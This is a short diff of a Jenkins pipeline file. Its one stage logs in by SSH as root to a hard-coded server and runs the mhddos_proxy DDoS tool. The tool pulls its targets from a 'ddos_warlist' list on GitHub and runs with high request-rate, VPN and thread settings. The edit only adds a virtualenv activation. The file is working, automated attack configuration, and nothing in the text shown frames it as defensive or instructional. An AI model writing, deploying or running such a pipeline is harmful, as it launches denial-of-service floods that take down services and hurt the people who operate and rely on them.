@@ -13,7 +13,7 @@ pipeline {
     stages {
         stage("First step") {
             steps {
-                sh 'ssh root@164.92.163.4 \'python3.9 /root/mhddos_proxy/runner.py -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_all.lst --rpc 1000 --vpn  -t 130\''
+                sh 'ssh root@164.92.163.4 \'. ~/venv/bin/activate\' \'python3.9 /root/mhddos_proxy/runner.py -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_all.lst --rpc 1000 --vpn  -t 130\''
             }
         }
         stage("Second step") {
